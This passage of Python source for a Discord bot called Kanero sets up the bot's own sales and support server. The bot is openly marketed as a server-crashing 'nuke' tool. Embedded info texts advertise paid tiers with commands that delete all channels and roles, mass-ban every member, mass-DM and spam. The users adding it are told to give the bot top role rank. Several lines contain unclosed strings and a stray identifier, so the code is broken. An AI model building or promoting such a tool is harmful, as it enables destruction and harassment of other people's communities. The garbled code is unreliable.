    news_tests_ch = await guild.create_text_channel("📰・news", category=cat_tests, overwrites=tests_info_ow(), topic="📰 НОВОСТИ ДЛЯ ТЕСТЕРОВ | Обновления, новые функции для тестирования, важные объявления")
    
    # Отправляем приветственное сообщение в канал новостей
    news_embed = discord.Embed(
        title="📰 Новости для тестеров",
        description="Добро пожаловать в канал новостей! Здесь будут публиковаться важные обновления и новые функции для тестирования.",
        color=0x00ff00
    )
    news_embed.add_field(
        name="🔔 Что здесь публикуется",
        value=(
            "• **Новые функции** для тестирования\n"
            "• **Обновления бота** и изменения\n"
            "• **Важные объявления** от разработчиков\n"
            "• **Результаты тестирования** и исправления\n"
            "• **Благодарности** активным тестерам"
        ),
        inline=False
    )
    news_embed.add_field(
        name="📋 Как быть в курсе",
        value=(
            "1. **Включи уведомления** для этого канала\n"
            "2. **Читай регулярно** — не пропускай важное\n"
            "3. **Реагируй эмодзи** если прочитал\n"
            "4. **Задавай вопросы** в 🧪・testing"
        ),
        inline=False
    )
    news_embed.set_footer(text="☠️ Kanero  |  Следи за новостями!")
    await news_tests_ch.send(embed=news_embed)
    
    await guild.create_text_channel("🐛・bug-reports", category=cat_tests, overwrites=tests_ow(), topic="🐛 ОТЧЁТЫ О БАГАХ | Создай тред → Название бага → Шаги воспроизведения → Ожидаемый результат → Скриншоты")
    await guild.create_text_channel("🧪・testing", category=cat_tests, overwrites=tests_ow(), topic="🧪 ОБСУЖДЕНИЕ | Обсуждай новые функции, делись идеями, помогай друг другу, задавай вопросы")
    await guild.create_text_channel("✅・test-results", category=cat_tests, overwrites=tests_ow(), topic="✅ РЕЗУЛЬТАТЫ ТЕСТОВ | Создай тред для каждой функции → ✅ работает / ❌ баг / ⚠️ улучшить")

    # 🔊 🎙 ВОЙСЫ — видимые каналы для голоса 🔊🎙
    def voice_base_ow():
        ow = {guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False)}
        if role_guest:  ow[role_guest]  = discord.PermissionOverwrite(connect=False, view_channel=True)
        if role_user:   ow[role_user]   = discord.PermissionOverwrite(connect=False, view_channel=True)
        if role_white:  ow[role_white]  = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_premium:ow[role_premium]= discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_owner:  ow[role_owner]  = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_dev:    ow[role_dev]    = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        return ow
    
    def voice_premium_ow():
        ow = {guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False)}
        if role_guest:  ow[role_guest]  = discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_user:   ow[role_user]   = discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_white:  ow[role_white]  = discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_premium:ow[role_premium]= discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_owner:  ow[role_owner]  = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_dev:    ow[role_dev]    = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        return ow
    
    def voice_admin_ow():
        ow = {guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False)}
        if role_guest:  ow[role_guest]  = discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_user:   ow[role_user]   = discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_white:  ow[role_white]  = discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_premium:ow[role_premium]= discord.PermissionOverwrite(connect=False, view_channel=False)
        if role_tester: ow[role_tester] = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_mod:    ow[role_mod]    = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_owner:  ow[role_owner]  = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        if role_dev:    ow[role_dev]    = discord.PermissionOverwrite(connect=True, speak=True, view_channel=True)
        return ow
    
    cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━", overwrites=voice_base_ow())
    for i in range(1, 4):
        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
    await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites=voice_premium_ow())

    # 🔧 ━━ ADMIN — только Owner+ 🔧
    cat_admin = await guild.create_category("━━━━ 🔧 ADMIN ━━━━", overwrites=admin_ow())
    
    def admin_chat_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow()
        if role_user:   ow[role_user]   = _ow()
        if role_white:  ow[role_white]  = _ow()
        if role_premium:ow[role_premium]= _ow()
        if role_friend: ow[role_friend] = _ow()
        if role_tester: ow[role_tester] = _ow(True, True)  # Тестеры могут читать и писать
        if role_mod:    ow[role_mod]    = _ow(True, True)  # Модераторы могут читать и писать
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    # Порядок: admin-chat → logs → выдача-листа
    await guild.create_text_channel("🔧・admin-chat", category=cat_admin, overwrites=admin_chat_ow(), topic="Чат для Owner, Developer, Moderator и Tester")
    await guild.create_text_channel("📊・logs", category=cat_admin, overwrites=admin_ow(), topic="Логи нюков с !nukelogs и ссылками на серверы")
    await guild.create_text_channel("📝・выдача-листа", category=cat_admin, overwrites=admin_ow(), topic="Логи выдачи подписок и компенсаций")
    await guild.create_voice_channel("👑 admin-voice", category=cat_admin, overwrites=voice_admin_ow())

    # -- 5. Правила и инфо --

    await welcome_ch.send(embed=discord.Embed(
        title="👋 Добро пожаловать на сервер Kanero!",
        description=(
            "Это официальный сервер бота для краша серверов.\n\n"
            "**Как начать:**\n"
            "1. Зайди в 🤖・addbot и добавь бота на сервер\n"
            "2. Получишь роль 👥 User и доступ к боту\n"
            "3. Начинай юзать на своих серверах\n\n"
            "**Купить White/Premium:** заходи в 💰・sell\n"
            "**Поддержка:** создай тикет в 🎫・create-ticket\n"
            "**Ссылка:** https://discord.gg/nNTB37QNCG"
        ), color=0x0a0a0a
    ).set_footer(text="☠️ Kanero"))

    r = discord.Embed(title="📜 Правила в Kanero", color=0x0a0a0a)
    r.add_field(
        name="📜 Основные правила",
        value=(
            "**1.** Уважай участников сервера\n"
            "**2.** Без флуда и спама в чатах\n"
            "**3.** Без рекламы без разрешения администрации\n"
            "**4.** Без оскорблений и токсичности\n"
            "**5.** Соблюдай Discord ToS\n"
            "**6.** Без попрошайничества ролей\n"
            "**7.** ⛔ **Попытка краша этого сервера запрещена**\n"
            "**8.** ⚠ **Нарушил правила — будешь наказан мгновенно**"
        ),
        inline=False
    )
    r.add_field(
        name="🎭 Роли на сервере",
        value=(
            "🤖 Kanero • 🔧 Developer • 👑 Owner\n"
            "🛡️ Moderator • 🧪 Tester • 🎬 Media • 🤝 Friend\n"
            "💎 Premium • ✅ White • 👥 User • 👤 Guest"
        ),
        inline=False
    )
    r.add_field(
        name="🧪 Роль Tester",
        value=(
            "**Что делают тестеры:**\n"
            "• Тестируют новые функции бота\n"
            "• Ищут баги и сообщают о них\n"
            "• Помогают улучшать бота\n"
            "• Имеют доступ к категории 🧪 TESTS\n\n"
            "**Как стать тестером:**\n"
            "Обратись к администрации через тикет"
        ),
        inline=False
    )
    r.add_field(
        name="🚀 Как начать",
        value=(
            "**User (freelist):** зайди в 🤖・addbot\n"
            "**White/Premium:** покупка в 🔧・панель-бота\n"
            "**Поддержка:** создай тикет в 🎫・create-ticket"
        ),
        inline=False
    )
    r.set_footer(text="☠️ Kanero  |  Нарушение правил = бан")
    await rules_ch.send(embed=r)

    # Отправляем сообщение в #info
    info_embed = discord.Embed(
        title="ℹ️ Информация о Kanero",
        description=(
            "**🤖 Как добавить бота на свой сервер:**\n"
            "1. Читаем правила (см. выше)\n"
            "2. Пишешь `!inv` боту в лс или тут на сервере\n"
            "3. Жмёшь на ссылку и даёшь боту права\n"
            "4. **ВАЖНО:** все роли бота в иерархии **САМЫЕ ВЕРХНИЕ**\n"
            "5. Готово! Твой бота **готов нюки** и выполнять команды\n"
            "6. Начни! Используй команды\n\n"
            "**📁 Бесплатный доступ (Freelist):**\n"
            f"Добавь бота используя в {addbot_ch.mention if addbot_ch else '🤖・addbot'}\n"
            "Получишь роль 👥 User и команды:\n"
            "• `!nuke` — удаляет все каналы и создаёт 30 новых за секунду\n"
            "• `!auto_nuke on/off` — автоматический нюки при добавлении бота\n"
            "• `!help` — список всех команд\n"
            "• `!changelog` — последние обновления\n\n"
            "**✅ White (платная версия):**\n"
            "Все команды Freelist + дополнительно:\n"
            "• `!nuke [канал]` — нюки с любым текстом канала\n"
            "• `!stop` — остановить нюки\n"
            "• `!cleanup` — удалить все каналы\n"
            "• `!rename [название]` — переименовать сервер\n"
            "• `!nicks_all [имя]` — сменить всем ники\n"
            "• `!webhooks` — создать 50 вебхуков\n"
            "• `!clear [канал]` — удалить сообщения\n"
            "• `!clear_all` — удалить все сообщения в канале\n\n"
            "**💎 Premium (максимальная версия):**\n"
            "Все команды White + мощные команды:\n"
            "• `!super_nuke` — усиленный нюки (новые роли + удалить всех)\n"
            "• `!auto_super_nuke on/off` — автоматический супер-нюки\n"
            "• `!massban` — забанить всех участников\n"
            "• `!massdm [текст]` — отправить лс всем\n"
            "• `!spam [канал] [текст]` — спам в канале\n"
            "• `!pingspam [@роль] [текст]` — спам упоминаниями\n"
            "• `!rolesdelete` — удалить все роли\n\n"
            "**💰 Купить White / Premium:**\n"
            "Покупка на FunPay с любым методом:\n"
            "https://funpay.com/users/16928925/ \n\n"
            "**❓ Нужна помощь?**\n"
            f"Создай тикет: {ticket_ch.mention if ticket_ch else '🎫・create-ticket'}\n"
            "Администрация ответит в течение 24 часов\n\n"
            "**🔗 Наш Discord сервер:**\n"
            "https://discord.gg/nNTB37QNCG \n"
            "Заходи к нам в гости!"
        ),
        color=0x0a0a0a
    )
    info_embed.set_footer(text="☠️ Kanero  |  Нюки-бот для Discord")
    await info_ch.send(embed=info_embed)

    a = discord.Embed(title="🤖 Добавить бота в Kanero", color=0x0a0a0a)
    a.add_field(name="📁 Freelist (бесплатно)", value="Добавь **бота используя** бота\nПолучишь роль 👥 User:\n`!nuke` • `!auto_nuke` • `!help` • `!changelog`", inline=False)
    a.add_field(name="✅ White", value="`!nuke [канал]` • `!stop` • `!cleanup`\n`!rename` • `!nicks_all` • `!webhooks`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
    a.add_field(name="💎 Premium", value="`!super_nuke` • `!massban` • `!massdm`\n`!spam` • `!pingspam` • `!rolesdelete`\n`!auto_super_nuke` • `!auto_superpr_nuke`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
    a.set_footer(text="☠️ Kanero  |  Лучший нюкер для-бота")
    await addbot_ch.send(embed=a)

    # Кнопка с созданием тикета в create-ticket
    ticket_embed = discord.Embed(
        title="🎫 Поддержка в Kanero",
        description=(
            "Нужна помощь? Есть вопрос?\n\n"
            "Чтобы создать тикет с нами нажмите следующую кнопку ниже или напиши в личные сообщения.\n\n"
            "• Вопросы по боту\n"
            "• Покупка White / Premium\n"
            "• Помощь с настройками\n\n"
            "**🛡️ Команда поддержки:**\n"
            "👑 Owner • 🔧 Developer • 🛡️ Moderator • 🧪 Tester\n\n"
            "**🔗 Хочу Discord сервер с поддержкой?**\n"
            "Если у тебя есть **свой сервер** на каком-либо Discord сервере с поддержкой (типа краша), напиши нам!\n"
            "Возможность стать нашим **партнёром сервером** с ролью 🤝"
        ),
        color=0x0a0a0a
    )
    ticket_embed.set_footer(text="☠️ Kanero  |  Твоя помощь не заставится")
    await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())

    await logs_ch.send(embed=discord.Embed(
        title="📊 Логи в Kanero",
        description="`!nukelogs` — логи ролей\n`!list` — whitelist/premium\n`!fl_list` — freelist\n`!auto_info` — статус авто нюков",
        color=0x0a0a0a
    ).set_footer(text="☠️ Kanero  |  Только Owner+"))

    # -- Новости и продажа в sell --
    await _post_news_and_sell(guild)

    embed = discord.Embed(
        title="✅ Kanero — сервер настроен",
        description=(
            "**Роли:** 🤖 Kanero • 🔧 Developer • 👑 Owner • 💎 Premium • ✅ White • 👥 User • 👤 Guest • 🧪 Tester • 🛡️ Moderator\n\n"
            "**Каналы:**\n"
            "👋 WELCOME: welcome (все видят)\n"
            "ℹ️ INFO: info и changelog (Guest+)\n"
            "💬 ОСНОВНОЕ: правила, новости, addbot, партнёрство, sell (Guest+)\n"
            "💬 ЧАТЫ: общий, игры, create-ticket (Guest+)\n"
            "📋 ЛИСТ ЧАТЫ: freelist-chat (User+), white-chat (White+), premium-chat (Premium+)\n"
            "🧪 TESTS: info, news, bug-reports, testing, test-results (Tester+)\n"
            "🔊 ВОЙСЫ: voice-1/2/3, premium-voice, admin-voice\n"
            "🔧 ADMIN: logs, admin-chat, выдача-листа (Owner+)\n\n"
            f"Авто-роль для новых: {f'<@&{role_guest.id}>' if role_guest else '👤 Guest'}\n"
            "Роль 👥 User выдаётся при добавлении в addbot."
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  Завершение команды setup  |  !giverole @юзер @роль")
    await msg.edit(content=None, embed=embed)


@bot.command(name="setup_update")
async def setup_update(ctx):
    """Обновить сервер без удаления каналов. Только для овнеров."""
    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
        await ctx.send("❌ Только для овнеров.")
        return
    guild = ctx.guild
    msg = await ctx.send("⚙️ Обновляю сервер без удаления каналов...")
    results = []

    # 1. @everyone с правом не видеть
    try:
        await guild.default_role.edit(permissions=discord.Permissions(
            read_messages=False, send_messages=False, connect=False, use_application_commands=False
        ))
        results.append("✅ @everyone обновлён")
    except Exception as e:
        results.append(f"❌ @everyone: {e}")

    # 2. Обновляем права ролей
    role_updates = {
        "👤 Guest":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False),
        "👥 User":    discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False),
        "✅ White":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False),
        "💎 Premium": discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False),
    }
    for rname, perms in role_updates.items():
        role = discord.utils.find(lambda r: r.name == rname, guild.roles)
        if role:
            try:
                await role.edit(permissions=perms)
                results.append(f"✅ {rname}")
            except Exception as e:
                results.append(f"❌ {rname}: {e}")
        else:
            results.append(f"⚠️ {rname} не найдена — создаю")
            try:
                await guild.create_role(name=rname)
            except Exception:
                pass

    # 3. Создаём дополнительные роли
    for rname in ("🛡️ Moderator", "🎬 Media", "🤝 Friend", "🧪 Tester"):
        existing_role = discord.utils.find(lambda r: r.name == rname, guild.roles)
        if not existing_role:
            try:
                await guild.create_role(name=rname)
                results.append(f"✅ Создана {rname}")
            except Exception:
                pass
        else:
            results.append(f"⚠️ {rname} уже существует")

    # 4. ADMIN — обновляем права и создаём admin-chat если нет
    def _ow(read=False, write=False):
        return discord.PermissionOverwrite(read_messages=read, send_messages=write)

    role_owner  = discord.utils.find(lambda r: r.name == "👑 Owner",    guild.roles)
    role_dev    = discord.utils.find(lambda r: r.name == "🔧 Developer", guild.roles)
    role_guest  = discord.utils.find(lambda r: r.name == "👤 Guest",    guild.roles)
    role_user   = discord.utils.find(lambda r: r.name == "👥 User",     guild.roles)
    role_white  = discord.utils.find(lambda r: r.name == "✅ White",    guild.roles)
    role_prem   = discord.utils.find(lambda r: r.name == "💎 Premium",  guild.roles)
    role_friend = discord.utils.find(lambda r: r.name == "🤝 Friend",   guild.roles)

    # -- Выдаём всем роль Guest если у них нет ролей --
    if role_guest:
        try:
            guest_count = 0
            for member in guild.members:
                if member.bot:
                    continue
                # Проверяем есть ли у участника роли (кроме @everyone)
                if len(member.roles) == 1:  # Только @everyone
                    try:
                        await member.add_roles(role_guest, reason="Setup Update - авто-выдача Guest")
                        guest_count += 1
                    except Exception:
                        pass
            if guest_count > 0:
                results.append(f"✅ Выдана роль 👤 Guest {guest_count} участникам")
        except Exception as e:
            results.append(f"❌ Ошибка Guest: {e}")

    # 4. ADMIN — обновляем права и создаём admin-chat если нет
    admin_cat = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
    if admin_cat:
        # Обновляем права остальных каналов
        for ch in admin_cat.channels:
            if "admin-chat" in ch.name.lower():
                continue  # admin-chat обрабатываем отдельно
            try:
                ow = {guild.default_role: discord.PermissionOverwrite(read_messages=False)}
                for r in guild.roles:
                    if r.name in ("👑 Owner", "🔧 Developer", Kanero):
                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
                await ch.edit(overwrites=ow)
            except Exception:
                pass
        # Создаём admin-chat если нет
        existing_names = [ch.name.lower() for ch in admin_cat.channels]
        if not any("admin-chat" in n for n in existing_names):
            try:
                ow = {guild.default_role: _ow()}
                if role_guest:  ow[role_guest]  = _ow(False, False)
                if role_user:   ow[role_user]   = _ow(False, False)
                if role_white:  ow[role_white]  = _ow(False, False)
                if role_prem:   ow[role_prem]   = _ow(False, False)
                if role_friend: ow[role_friend] = _ow(False, False)
                if role_owner:  ow[role_owner]  = _ow(True, True)
                if role_dev:    ow[role_dev]    = _ow(True, True)
                await guild.create_text_channel("🔧・admin-chat", category=admin_cat, overwrites=ow, topic="Чат для Owner и Developer")
                results.append("✅ Создан 🔧・admin-chat")
            except Exception as e:
                results.append(f"❌ admin-chat: {e}")
        # Создаём выдача-листа если нет
        if not any("выдача" in n for n in existing_names):
            try:
                ow = {guild.default_role: _ow()}
                if role_guest:  ow[role_guest]  = _ow(False, False)
                if role_user:   ow[role_user]   = _ow(False, False)
                if role_white:  ow[role_white]  = _ow(False, False)
                if role_prem:   ow[role_prem]   = _ow(False, False)
                if role_friend: ow[role_friend] = _ow(False, False)
                if role_owner:  ow[role_owner]  = _ow(True, True)
                if role_dev:    ow[role_dev]    = _ow(True, True)
                await guild.create_text_channel("📝・выдача-листа", category=admin_cat, overwrites=ow, topic="Логи выдачи подписок и компенсаций")
                results.append("✅ Создан 📝・выдача-листа")
            except Exception as e:
                results.append(f"❌ выдача-листа: {e}")
        results.append("✅ ADMIN обновлён")

    # 5. Создаём недостающие каналы в ОСНОВНОЕ
    cat_main = discord.utils.find(lambda c: "ОСНОВНОЕ" in c.name or "ОБЩЕНИЕ" in c.name, guild.categories)
    if cat_main:
        # Переименовываем категорию если нужно
        if "ОБЩЕНИЕ" in cat_main.name:
            try:
                await cat_main.edit(name="━━━━ 💬 ОСНОВНОЕ ━━━━")
                results.append("✅ Переименована категория ОБЩЕНИЕ → ОСНОВНОЕ")
            except Exception as e:
                results.append(f"❌ Переименование категории: {e}")
        
        existing = [ch.name.lower() for ch in cat_main.channels]
        missing_channels = []
        if not any("sell" in n for n in existing):
            missing_channels.append(("💰・sell", "Покупка White/Premium и только только Owner"))
        if not any("выдача" in n for n in existing):
            missing_channels.append(("📝・выдача-листа", "Логи выдачи подписок и компенсаций"))
        for ch_name, topic in missing_channels:
            try:
                ow = {guild.default_role: _ow()}
                if role_guest: ow[role_guest] = _ow(True, False)
                if role_user:  ow[role_user]  = _ow(True, False)
                if role_white: ow[role_white] = _ow(True, False)
                if role_prem:  ow[role_prem]  = _ow(True, False)
                if role_owner: ow[role_owner] = _ow(True, True)
                if role_dev:   ow[role_dev]   = _ow(True, True)
                await guild.create_text_channel(ch_name, category=cat_main, overwrites=ow, topic=topic)
                results.append(f"✅ Создан {ch_name}")
            except Exception as e:
                results.append(f"❌ {ch_name}: {e}")

    # 6. Создаём категорию INFO и канал #info если их нет
    cat_info = discord.utils.find(lambda c: "INFO" in c.name, guild.categories)
    if not cat_info:
        try:
            ow_info = {guild.default_role: _ow()}
            if role_guest: ow_info[role_guest] = _ow(True, False)
            if role_user:  ow_info[role_user]  = _ow(True, False)
            if role_white: ow_info[role_white] = _ow(True, False)
            if role_prem:  ow_info[role_prem]  = _ow(True, False)
            if role_owner: ow_info[role_owner] = _ow(True, True)
            if role_dev:   ow_info[role_dev]   = _ow(True, True)
            cat_info = await guild.create_category("━━━━ ℹ️ INFO ━━━━", overwrites=ow_info)
            # Позиционируем INFO под WELCOME (позиция 1)
            cat_welcome = discord.utils.find(lambda c: "WELCOME" in c.name, guild.categories)
            if cat_welcome:
                try:
                    await cat_info.edit(position=cat_welcome.position + 1)
                except Exception:
                    pass
            results.append("✅ Создана категория INFO")
        except Exception as e:
            results.append(f"❌ Категория INFO: {e}")
    else:
        # Если INFO уже существует, позиционируем её правильно
        cat_welcome = discord.utils.find(lambda c: "WELCOME" in c.name, guild.categories)
        if cat_welcome and cat_info.position != cat_welcome.position + 1:
            try:
                await cat_info.edit(position=cat_welcome.position + 1)
                results.append("✅ Перемещена категория INFO под WELCOME")
            except Exception:
                pass
    
    # Перемещаем #changelog из основного в INFO если он там
    changelog_ch = discord.utils.find(lambda c: "changelog" in c.name.lower(), guild.text_channels)
    if changelog_ch and cat_info and changelog_ch.category != cat_info:
        try:
            await changelog_ch.edit(category=cat_info)
            results.append("✅ Перемещён 📋・changelog в INFO")
        except Exception as e:
            results.append(f"❌ Перенос changelog: {e}")
    
    if cat_info:
        existing_info = [ch.name.lower() for ch in cat_info.channels]
        if not any("info" in n for n in existing_info):
            try:
                ow_info_ch = {guild.default_role: _ow()}
                if role_guest: ow_info_ch[role_guest] = _ow(True, False)
                if role_user:  ow_info_ch[role_user]  = _ow(True, False)
                if role_white: ow_info_ch[role_white] = _ow(True, False)
                if role_prem:  ow_info_ch[role_prem]  = _ow(True, False)
                if role_owner: ow_info_ch[role_owner] = _ow(True, True)
                if role_dev:   ow_info_ch[role_dev]   = _ow(True, True)
                info_ch = await guild.create_text_channel("ℹ️・info", category=cat_info, overwrites=ow_info_ch, topic="Информация о сервере правила и прочее")
                # Отправляем сообщение в #info
                ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
                addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
                info_embed = discord.Embed(
                    title="ℹ️ Информация о Kanero",
                    description=(
                        "**🤖 Как добавить бота на свой сервер:**\n"
                        "1. Читаем правила (см. выше)\n"
                        "2. Пишешь `!inv` боту в лс или тут на сервере\n"
                        "3. Жмёшь на ссылку и даёшь боту права\n"
                        "4. **ВАЖНО:** все роли бота в иерархии **САМЫЕ ВЕРХНИЕ**\n"
                        "5. Готово! Твой бота **готов нюки** и выполнять команды\n"
                        "6. Начни! Используй команды\n\n"
                        "**📁 Бесплатный доступ (Freelist):**\n"
                        f"Добавь бота используя в {addbot_ch.mention if addbot_ch else '🤖・addbot'}\n"
                        "Получишь роль 👥 User и команды:\n"
                        "• `!nuke` — удаляет все каналы и создаёт 30 новых за секунду\n"
                        "• `!auto_nuke on/off` — автоматический нюки при добавлении бота\n"
                        "• `!help` — список всех команд\n"
                        "• `!changelog` — последние обновления\n\n"
                        "**✅ White (платная версия):**\n"
                        "Все команды Freelist + дополнительно:\n"
                        "• `!nuke [канал]` — нюки с любым текстом канала\n"
                        "• `!stop` — остановить нюки\n"
                        "• `!cleanup` — удалить все каналы\n"
                        "• `!rename [название]` — переименовать сервер\n"
                        "• `!nicks_all [имя]` — сменить всем ники\n"
                        "• `!webhooks` — создать 50 вебхуков\n"
                        "• `!clear [канал]` — удалить сообщения\n"
                        "• `!clear_all` — удалить все сообщения в канале\n\n"
                        "**💎 Premium (максимальная версия):**\n"
                        "Все команды White + мощные команды:\n"
                        "• `!super_nuke` — усиленный нюки (новые роли + удалить всех)\n"
                        "• `!auto_super_nuke on/off` — автоматический супер-нюки\n"
                        "• `!massban` — забанить всех участников\n"
                        "• `!massdm [текст]` — отправить лс всем\n"
                        "• `!spam [канал] [текст]` — спам в канале\n"
                        "• `!pingspam [@роль] [текст]` — спам упоминаниями\n"
                        "• `!rolesdelete` — удалить все роли\n\n"
                        "**💰 Купить White / Premium:**\n"
                        "Покупка на FunPay с любым методом:\n"
                        "https://funpay.com/users/16928925/ \n\n"
                        "**❓ Нужна помощь?**\n"
                        f"Создай тикет: {ticket_ch.mention if ticket_ch else '🎫・create-ticket'}\n"
                        "Администрация ответит в течение 24 часов\n\n"
                        "**🔗 Наш Discord сервер:**\n"
                        "https://discord.gg/nNTB37QNCG \n"
                        "Заходи к нам в гости!"
                    ),
                    color=0x0a0a0a
                )
                info_embed.set_footer(text="☠️ Kanero  |  Нюки-бот для Discord")
                await info_ch.send(embed=info_embed)
                results.append("✅ Создан ℹ️・info")
            except Exception as e:
                results.append(f"❌ ℹ️・info: {e}")
        else:
            # Канал #info уже существует, обновляем в нём старое сообщение
            info_ch = discord.utils.find(lambda c: "info" in c.name.lower(), cat_info.channels)
            if info_ch:
                try:
                    # Ищем существующее сообщение бота с embed "Информация оKanero
                    existing_message = None
                    async for message in info_ch.history(limit=50):
                        if (message.author == bot.user and message.embeds and 
                            len(message.embeds) > 0 and 
                            "Информация оKanero in message.embeds[0].title):
                            existing_message = message
                            break
                    
                    # Получаем актуальные каналы из сервера
                    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
                    addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
                    
                    # Создаём обновлённый embed с актуальными каналами
                    info_embed = discord.Embed(
                        title="ℹ️ Информация о Kanero",
                        description=(
                            "**🤖 Как добавить бота на свой сервер:**\n"
                            "1. Читаем правила (см. выше)\n"
                            "2. Пишешь `!inv` боту в лс или тут на сервере\n"
                            "3. Жмёшь на ссылку и даёшь боту права\n"
                            "4. **ВАЖНО:** все роли бота в иерархии **САМЫЕ ВЕРХНИЕ**\n"
                            "5. Готово! Твой бота **готов нюки** и выполнять команды\n"
                            "6. Начни! Используй команды\n\n"
                            "**📁 Бесплатный доступ (Freelist):**\n"
                            f"Добавь бота используя в {addbot_ch.mention if addbot_ch else '🤖・addbot'}\n"
                            "Получишь роль 👥 User и команды:\n"
                            "• `!nuke` — удаляет все каналы и создаёт 30 новых за секунду\n"
                            "• `!auto_nuke on/off` — автоматический нюки при добавлении бота\n"
                            "• `!help` — список всех команд\n"
                            "• `!changelog` — последние обновления\n\n"
                            "**✅ White (платная версия):**\n"
                            "Все команды Freelist + дополнительно:\n"
                            "• `!nuke [канал]` — нюки с любым текстом канала\n"
                            "• `!stop` — остановить нюки\n"
                            "• `!cleanup` — удалить все каналы\n"
                            "• `!rename [название]` — переименовать сервер\n"
                            "• `!nicks_all [имя]` — сменить всем ники\n"
                            "• `!webhooks` — создать 50 вебхуков\n"
                            "• `!clear [канал]` — удалить сообщения\n"
                            "• `!clear_all` — удалить все сообщения в канале\n\n"
                            "**💎 Premium (максимальная версия):**\n"
                            "Все команды White + мощные команды:\n"
                            "• `!super_nuke` — усиленный нюки (новые роли + удалить всех)\n"
                            "• `!auto_super_nuke on/off` — автоматический супер-нюки\n"
                            "• `!massban` — забанить всех участников\n"
                            "• `!massdm [текст]` — отправить лс всем\n"
                            "• `!spam [канал] [текст]` — спам в канале\n"
                            "• `!pingspam [@роль] [текст]` — спам упоминаниями\n"
                            "• `!rolesdelete` — удалить все роли\n\n"
                            "**💰 Купить White / Premium:**\n"
                            "Покупка на FunPay с любым методом:\n"
                            "https://funpay.com/users/16928925/ \n\n"
                            "**❓ Нужна помощь?**\n"
                            f"Создай тикет: {ticket_ch.mention if ticket_ch else '🎫・create-ticket'}\n"
                            "Администрация ответит в течение 24 часов\n\n"
                            "**🔗 Наш Discord сервер:**\n"
                            "https://discord.gg/nNTB37QNCG \n"
                            "Заходи к нам в гости!"
                        ),
                        color=0x0a0a0a
                    )
                    info_embed.set_footer(text="☠️ Kanero  |  Нюки-бот для Discord")
                    
                    if existing_message:
                        # Обновляем существующее сообщение
                        await existing_message.edit(embed=info_embed)
                        results.append("✅ Обновлено инфо в ℹ️・info")
                    else:
                        # Отправляем новое сообщение если старого нет
                        await info_ch.send(embed=info_embed)
                        results.append("✅ Отправлено сообщение в ℹ️・info")
                except Exception as e:
                    results.append(f"❌ Обновление ℹ️・info: {e}")
        if not any("changelog" in n for n in existing_info):
            try:
                ow_changelog = {guild.default_role: _ow()}
                if role_guest: ow_changelog[role_guest] = _ow(True, False)
                if role_user:  ow_changelog[role_user]  = _ow(True, False)
                if role_white: ow_changelog[role_white] = _ow(True, False)
                if role_prem:  ow_changelog[role_prem]  = _ow(True, False)
                if role_owner: ow_changelog[role_owner] = _ow(True, True)
                if role_dev:   ow_changelog[role_dev]   = _ow(True, True)
                await guild.create_text_channel("📋・changelog", category=cat_info, overwrites=ow_changelog, topic="История обновлений с !changelogall")
                results.append("✅ Создан 📋・changelog")
            except Exception as e:
                results.append(f"❌ 📋・changelog: {e}")

    # 7. Обновляем и отправляем сообщение в create-ticket если нужно
    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
    if ticket_ch:
        try:
            results.append(f"🔍 Найден канал: {ticket_ch.name}")
            
            # Ищем существующее сообщение бота с embed "Поддержка вKanero
            existing_message = None
            message_count = 0
            async for message in ticket_ch.history(limit=50):
                message_count += 1
                if (message.author == bot.user and message.embeds and 
                    len(message.embeds) > 0 and 
                    "Поддержка вKanero in message.embeds[0].title):
